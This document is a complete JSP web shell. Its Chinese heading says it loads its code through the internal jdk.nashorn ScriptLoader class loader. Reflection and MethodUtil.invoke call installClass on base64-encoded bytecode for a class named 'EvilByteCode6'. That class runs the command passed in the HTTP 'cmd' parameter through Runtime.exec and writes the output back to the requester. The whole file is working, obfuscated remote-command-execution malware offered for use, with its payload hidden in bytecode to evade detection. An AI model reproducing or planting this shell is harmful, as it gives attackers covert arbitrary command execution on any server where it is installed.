<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP WebShell</h2>
<%
    Class c = Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
    final Constructor constructor = c.getDeclaredConstructor(Context.class);
    constructor.setAccessible(true);
    final Method m = c.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
    m.setAccessible(true);
    class A {
        B b;
        final class B {
            private Object o;
            private Object[] oo;

            public B() throws IllegalAccessException, InvocationTargetException, InstantiationException {
                o = constructor.newInstance(new Context(new Options(""), null, null));
                oo = new Object[]{"EvilByteCode6", Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MRXZpbEJ5dGVDb2RlNjsBAANjbWQBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmJ1ZmZlcmVkUmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEADVN0YWNrTWFwVGFibGUHAE4HAGAHAD8HAEABAApFeGNlcHRpb25zBwBhAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABWJ5dGVzAQACW0IBAARjb2RlAQAKU291cmNlRmlsZQEAEkV2aWxCeXRlQ29kZTYuamF2YQwAHQBiAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAYwwAZABlDABmAGcHAGgMAGkAagwAHQBrDAAdAGwMAG0AMgwAbgBvAQABCgwAMQAyDAAbABwBAA1FdmlsQnl0ZUNvZGU2BwBwDABxAHIBABNFdmlsQnl0ZUNvZGU2LmNsYXNzBwBzDAB0AHUHAHYMAHcAeAwAeQB6BwB7DAB8AH8HAIAMAIEAggcAgwwAhACFBwCGDACHAB4BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAPamF2YS9sYW5nL0NsYXNzAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATZ2V0UmVzb3VyY2VBc1N0cmVhbQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vSW5wdXRTdHJlYW07AQATamF2YS9pby9JbnB1dFN0cmVhbQEACWF2YWlsYWJsZQEAAygpSQEABHJlYWQBAAUoW0IpSQEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4AIQAQABoAAAABAAAAGwAcAAAAAwABAB0AHgACAB8AAADSAAYABQAAAEcqtwABuwACWbcAA027AARZuwAFWbgABiu2AAe2AAi3AAm3AApOLbYAC1k6BMYAEiwZBLYADBINtgAMV6f/6iostgAOtQAPsQAAAAMAIAAAAB4ABwAAAAsABAAMAAwADQAlAA8ALwAQAD4AEgBGABMAIQAAADQABQAAAEcAIgAjAAAAAABHACQAHAABAAwAOwAlACYAAgAlACIAJwAoAAMALAAbACkAHAAEACoAAAAbAAL/ACUABAcAKwcALAcALQcALgAA/AAYBwAsAC8AAAAEAAEAMAABADEAMgABAB8AAAAvAAEAAQAAAAUqtAAPsAAAAAIAIAAAAAYAAQAAABcAIQAAAAwAAQAAAAUAIgAjAAAACQAzADQAAgAfAAAAhAACAAQAAAAoEhC2ABESErYAE0wrtgAUvAhNKyy2ABVXuAAWLLYAF06yABgttgAZsQAAAAIAIAAAABoABgAAABsACwAcABIAHQAYAB4AIAAfACcAIAAhAAAAKgAEAAAAKAA1ADYAAAALAB0ANwA4AAEAEgAWADkAOgACACAACAA7ABwAAwAvAAAABAABADAAAgA8AAAAAgA9AH4AAAAKAAEAWQBXAH0ACQ=="), new CodeSource(null, (Certificate[]) null)};
            }
        }

        public A() throws IllegalAccessException, InstantiationException, InvocationTargetException {
            b = new B();
        }

        public Class invokex(Method method)
                throws InvocationTargetException, IllegalAccessException {
            return (Class) MethodUtil.invoke(method, b.o, b.oo);
        }
    }

    Class target = new A().invokex(m);
    response.getOutputStream().write(target.getConstructor(String.class).newInstance(request.getParameter("cmd")).toString().getBytes());
%>
</body>
</html>